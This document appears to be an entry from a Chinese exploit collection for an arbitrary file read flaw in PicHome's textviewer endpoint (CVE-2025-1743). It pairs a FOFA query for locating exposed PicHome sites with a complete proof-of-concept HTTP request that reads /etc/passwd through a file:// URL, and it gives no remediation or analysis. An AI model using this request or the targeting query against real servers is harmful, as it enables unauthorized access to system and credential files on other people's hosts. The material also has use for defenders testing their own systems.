# Pichome接口index存在任意文件读取(CVE-2025-1743)

# fofa
```
title="PicHome"
```
# poc
```javascript
GET /index.php?mod=textviewer&src=file:///etc/passwd HTTP/1.1
Host:
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9


```
